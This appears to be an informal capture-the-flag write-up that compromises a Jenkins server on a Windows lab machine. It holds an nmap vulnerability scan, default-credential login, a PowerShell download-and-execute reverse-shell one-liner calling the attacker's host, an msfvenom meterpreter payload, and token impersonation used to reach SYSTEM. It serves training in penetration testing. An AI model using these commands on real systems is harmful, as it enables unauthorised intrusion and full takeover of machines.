└──╼ $nmap -A -T4 --script vuln -p- -oN initial.nmap 10.10.60.95
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-12 14:28 UTC
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.60.95
Host is up (0.10s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-server-header: Microsoft-IIS/7.5
| vulners: 
|   cpe:/a:microsoft:internet_information_services:7.5: 
|     	PACKETSTORM:180580	10.0	https://vulners.com/packetstorm/PACKETSTORM:180580	*EXPLOIT*
|     	MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-	10.0	https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-FTP-IIS75_FTPD_IAC_BOF-	*EXPLOIT*
|     	CVE-2010-3972	10.0	https://vulners.com/cve/CVE-2010-3972
|     	SSV:20122	9.3	https://vulners.com/seebug/SSV:20122	*EXPLOIT*
|     	CVE-2010-2730	9.3	https://vulners.com/cve/CVE-2010-2730
|     	SSV:20121	4.3	https://vulners.com/seebug/SSV:20121	*EXPLOIT*
|     	PACKETSTORM:180584	4.3	https://vulners.com/packetstorm/PACKETSTORM:180584	*EXPLOIT*
|     	MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-	4.3	https://vulners.com/metasploit/MSF:AUXILIARY-DOS-WINDOWS-HTTP-MS10_065_II6_ASP_DOS-	*EXPLOIT*
|_    	CVE-2010-1899	4.3	https://vulners.com/cve/CVE-2010-1899
|_http-csrf: Couldn't find any CSRF vulnerabilities.
3389/tcp open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /robots.txt: Robots file
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find  any stored XSS vulnerabilities.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 576.27 seconds

system is blatantly running a webservice on an alt port 8080

nmap doesnt tell me about any reverse shells on 8080 so we had to try logging in

***unfortunately I navigated to the 10.10.60.95:8080/robots.txt file but didnt check the main page 10.10.60.95:8080 to see it was hosting jenkins

***the first flag was solved by googling the default uname and password for jenkins lol

***next we were instructed using nishang was a good idea so I put it on my desktop and hosted an http server in that directory to access the exploits

sudo ufw allow 8181
sudo ufw allow 4444

┌─[user@parrot]─[~/Desktop/nishang-master/Shells]
└──╼ $python3 -m http.server 8181
Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8080/) ...

netcat -lvnp 4444

Initial upload to jenkins
powershell iex (New-Object Net.WebClient).DownloadString(‘http://10.23.80.154:8181/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.23.80.154 -Port 4444

flag was on user desktop

┌─[user@parrot]─[~]
└──╼ $msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.23.80.154 LPORT=4444 -f exe -o name.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: name.exe

made msfvenom payload

[msf](Jobs:0 Agents:0) >> use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set HOST 10.23.80.154
[!] Unknown datastore option: HOST. Did you mean LHOST?
HOST => 10.23.80.154
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.23.80.154
LHOST => 10.23.80.154
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 4444
LPORT => 4444
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 10.23.80.154:4444 


started TCP handler for meterpreter

once in the challenge has you find a flag in the system

use incognito 

list_tokens -g

which shows the impersonate_token "BUILTIN\Administrators"  is available

 run the desired process such as the flag by migrating to a priviledged process

for example with "tasklist"

 find the PID of spooler and just

migrate 1219 

which enables me to migrate to the spooler service and then you can just 

cat C:\Windows\System32\config\root.txt

rooted the system PWNed